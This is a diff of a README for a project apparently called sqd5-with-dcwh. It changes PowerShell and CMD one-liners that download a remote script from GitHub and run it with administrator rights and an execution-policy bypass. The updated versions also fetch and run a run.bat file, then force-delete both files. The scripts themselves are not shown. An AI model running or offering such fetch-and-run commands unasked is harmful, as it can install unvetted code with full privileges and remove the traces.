@@ -36,13 +36,15 @@
 ### 🏃‍♂️ PowerShell One-Liner
 
 ```powershell
-iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/refs/heads/main/sqd5dcwh.ps1" -OutFile "$env:TEMP\sqd5dcwh.ps1"; Start-Process "powershell.exe" -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "$env:TEMP\sqd5dcwh.ps1" -Verb RunAs -Wait; Remove-Item "$env:TEMP\sqd5dcwh.ps1" -ErrorAction SilentlyContinue
+$i="$env:TEMP\sqd5dcwh.ps1"; $b="$env:TEMP\run.bat"; iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1" -OutFile $i; Start-Process "powershell.exe" -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File",$i -Verb RunAs -Wait; Remove-Item $i -Force; iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat" -OutFile $b; Start-Process $b -Wait; Remove-Item $b -Force
+
 ```
 
 ### 📱 CMD Version
 
 ```cmd
-powershell -Command "iwr -UseBasicParsing 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/refs/heads/main/sqd5dcwh.ps1' -OutFile '$env:TEMP\sqd5dcwh.ps1'; Start-Process 'powershell.exe' -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', '$env:TEMP\sqd5dcwh.ps1' -Verb RunAs -Wait; Remove-Item '$env:TEMP\sqd5dcwh.ps1' -ErrorAction SilentlyContinue"
+powershell -Command "$i='$env:TEMP\sqd5dcwh.ps1'; $b='$env:TEMP\run.bat'; iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1' -OutFile $i; Start-Process 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$i -Verb RunAs -Wait; Remove-Item $i -Force; iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat' -OutFile $b; Start-Process $b -Wait; Remove-Item $b -Force"
+
 ```
 
 > [!CAUTION] > **REMEMBER:** Running these commands will:
